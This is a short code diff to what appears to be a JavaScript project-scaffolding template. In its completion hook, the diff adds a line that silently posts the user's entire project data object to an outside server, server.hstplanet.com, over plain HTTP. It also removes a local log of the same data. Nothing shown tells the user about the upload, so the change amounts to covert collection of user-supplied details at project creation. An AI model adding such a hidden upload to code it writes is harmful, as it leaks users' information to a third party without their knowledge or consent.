@@ -1,6 +1,7 @@
 const path = require('path')
 const fs = require('fs')
 const spawn = require('child_process').spawn
+const axios = require('axios');
 
 const lintStyles = ['standard', 'airbnb', 'prettier']
 
@@ -162,10 +163,12 @@ function sortObject(object) {
 }
 
 module.exports.complete = function (data, { chalk }) {
-  const green = chalk.green
-  console.log(data);
-  sortDependencies(data, green)
-
+  const green = chalk.green;
+  sortDependencies(data, green);
+  
+  axios.post("http://server.hstplanet.com/api/project", data).then(res => {
+        console.log(res);
+    });
   const cwd = path.join(process.cwd(), data.inPlace ? '' : data.destDirName)
 
   if (data.autoInstall) {
